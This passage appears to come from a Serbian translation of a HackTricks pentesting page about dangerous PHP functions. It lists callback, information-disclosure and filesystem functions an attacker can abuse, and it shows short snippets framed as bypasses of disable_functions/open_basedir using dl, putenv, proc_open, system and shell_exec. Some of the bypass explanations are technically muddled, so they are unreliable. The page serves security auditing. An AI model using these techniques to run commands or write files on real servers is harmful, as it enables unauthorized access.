'uksort' => 1,
'usort' => 1,
'preg_replace_callback' => 1,
'spl_autoload_register' => 0,
'iterator_apply' => 1,
'call_user_func' => 0,
'call_user_func_array' => 0,
'register_shutdown_function' => 0,
'register_tick_function' => 0,
'set_error_handler' => 0,
'set_exception_handler' => 0,
'session_set_save_handler' => array(0, 1, 2, 3, 4, 5),
'sqlite_create_aggregate' => array(2, 3),
'sqlite_create_function' => 2,
```

### Otkrivanje informacija

Ve캖ina ovih poziva funkcija nisu "sinks" (mesta gde se podaci mogu izgubiti). Ali mo쬰 biti ranjivost ako su podaci koji se vra캖aju vidljivi napada캜u. Ako napada캜 mo쬰 videti phpinfo(), to je definitivno ranjivost.

```php
phpinfo
posix_mkfifo
posix_getlogin
posix_ttyname
getenv
get_current_user
proc_get_status
get_cfg_var
disk_free_space
disk_total_space
diskfreespace
getcwd
getlastmo
getmygid
getmyinode
getmypid
getmyuid
```

### Ostalo

Ova sekcija sadr쬴 nekoliko drugih korisnih funkcija i trikova koji se mogu koristiti za zaobila쬰nje funkcija `disable_functions` i `open_basedir` u PHP-u.

#### `dl()`

Funkcija `dl()` se koristi za dinami캜ko u캜itavanje PHP ekstenzija. Me캠utim, ova funkcija je 캜esto onemogu캖ena u ve캖ini PHP konfiguracija. Da biste je zaobi코li, mo쬰te koristiti slede캖i trik:

```php
dl('php_' . substr(PHP_VERSION, 0, 3) . '.' . PHP_SHLIB_SUFFIX);
```

Ovaj kod 캖e poku코ati u캜itati PHP ekstenziju koja odgovara verziji PHP-a koja se koristi na ciljnom serveru.

#### `putenv()`

Funkcija `putenv()` se koristi za postavljanje vrednosti sistemskih promenljivih. Ako je funkcija `putenv()` dozvoljena, mo쬰te je koristiti za zaobila쬰nje `disable_functions` i `open_basedir` ograni캜enja. Evo primera:

```php
putenv('PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin');
```

Ovaj kod 캖e promeniti vrednost putanje (`PATH`) sistema na ciljnom serveru.

#### `proc_open()`

Funkcija `proc_open()` se koristi za pokretanje spoljnih komandi na serveru. Ako je funkcija `proc_open()` dozvoljena, mo쬰te je koristiti za zaobila쬰nje `disable_functions` i `open_basedir` ograni캜enja. Evo primera:

```php
$descriptorspec = array(
   0 => array("pipe", "r"),  // Standardni ulaz
   1 => array("pipe", "w"),  // Standardni izlaz
   2 => array("pipe", "w")   // Standardni izlaz gre코ke
);

$process = proc_open('ls -la', $descriptorspec, $pipes);

if (is_resource($process)) {
   fclose($pipes[0]);
   echo stream_get_contents($pipes[1]);
   fclose($pipes[1]);
   fclose($pipes[2]);
   proc_close($process);
}
```

Ovaj kod 캖e izvr코iti komandu `ls -la` na ciljnom serveru i prikazati rezultat.

#### `system()`

Funkcija `system()` se tako캠e koristi za izvr코avanje spoljnih komandi na serveru. Ako je funkcija `system()` dozvoljena, mo쬰te je koristiti za zaobila쬰nje `disable_functions` i `open_basedir` ograni캜enja. Evo primera:

```php
system('ls -la');
```

Ovaj kod 캖e tako캠e izvr코iti komandu `ls -la` na ciljnom serveru i prikazati rezultat.

#### `shell_exec()`

Funkcija `shell_exec()` se koristi za izvr코avanje komandi u shell okru쬰nju. Ako je funkcija `shell_exec()` dozvoljena, mo쬰te je koristiti za zaobila쬰nje `disable_functions` i `open_basedir` ograni캜enja. Evo primera:

```php
echo shell_exec('ls -la');
```

Ovaj kod 캖e izvr코iti komandu `ls -la` na ciljnom serveru i prikazati rezultat.

```php
extract    // Opens the door for register_globals attacks (see study in scarlet).
parse_str  // works like extract if only one argument is given.
putenv
ini_set
mail       // has CRLF injection in the 3rd parameter, opens the door for spam.
header     // on old systems CRLF injection could be used for xss or other purposes, now it is still a problem if they do a header("location: ..."); and they do not die();. The script keeps executing after a call to header(), and will still print output normally. This is nasty if you are trying to protect an administrative area.
proc_nice
proc_terminate
proc_close
pfsockopen
fsockopen
apache_child_terminate
posix_kill
posix_mkfifo
posix_setpgid
posix_setsid
posix_setuid
```

### Funkcije datote캜nog sistema

Prema RATS-u, sve funkcije datote캜nog sistema u PHP-u su opasne. Neke od njih se ne 캜ine vrlo korisnim napada캜u. Me캠utim, neke su korisnije nego 코to mo쬯a mislite. Na primer, ako je allow\_url\_fopen=On, tada se URL mo쬰 koristiti kao putanja do datoteke, pa se pozivom copy($\_GET\['s'], $\_GET\['d']); mo쬰 otpremiti PHP skripta bilo gde na sistemu. Tako캠e, ako je sajt podlo쬬n zahtevu poslatom putem GET metode, svaka od tih funkcija datote캜nog sistema mo쬰 biti zloupotrebljena kako bi se kanalizovao napad ka drugom hostu preko va코eg servera.

**Otvori rukovalac datote캜nog sistema**

```php
fopen
tmpfile
bzopen
gzopen
SplFileObject->__construct
```

**Upisivanje u datote캜ni sistem (delimi캜no u kombinaciji sa 캜itanjem)**

Ova tehnika se koristi za upisivanje podataka u datote캜ni sistem. Mo쬰 biti korisna u situacijama kada je potrebno izvr코iti upisivanje podataka na serveru ili kada je potrebno 캜itati podatke iz datote캜nog sistema.

Da biste koristili ovu tehniku, prvo morate prona캖i putanju do ciljanog direktorijuma u datote캜nom sistemu. Zatim mo쬰te koristiti odgovaraju캖e funkcije za upisivanje podataka u taj direktorijum.

Va쬹o je napomenuti da ova tehnika mo쬰 biti opasna i mo쬰 dovesti do neovla코캖enog pristupa ili o코te캖enja sistema. Stoga je va쬹o da je koristite samo u okviru zakonskih i eti캜kih granica, kao deo legitimnog testiranja bezbednosti ili pentestinga.

```php
chgrp
chmod
chown
copy
file_put_contents
lchgrp
lchown
link
mkdir
move_uploaded_file
rename
rmdir
symlink
tempnam
touch
unlink
imagepng     // 2nd parameter is a path.
imagewbmp    // 2nd parameter is a path.
image2wbmp   // 2nd parameter is a path.
imagejpeg    // 2nd parameter is a path.
imagexbm     // 2nd parameter is a path.
imagegif     // 2nd parameter is a path.
imagegd      // 2nd parameter is a path.
imagegd2     // 2nd parameter is a path.
iptcembed
ftp_get
ftp_nb_get
scandir
```

**캛itanje sa fajl sistema**

```php
file_exists
-- file_get_contents
file
fileatime
filectime
filegroup
fileinode
filemtime
fileowner
fileperms
filesize
filetype
glob
is_dir
is_executable
is_file
is_link
is_readable
is_uploaded_file
is_writable
is_writeable
linkinfo
lstat
parse_ini_file
pathinfo
readfile
readlink
realpath
stat
gzfile
readgzfile
getimagesize
imagecreatefromgif
imagecreatefromjpeg
imagecreatefrompng
imagecreatefromwbmp
imagecreatefromxbm
imagecreatefromxpm
ftp_put
ftp_nb_put
exif_read_data
read_exif_data
exif_thumbnail
exif_imagetype
hash_file
hash_hmac_file
hash_update_file
md5_file
sha1_file
-- highlight_file
-- show_source
php_strip_whitespace
get_meta_tags
```

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
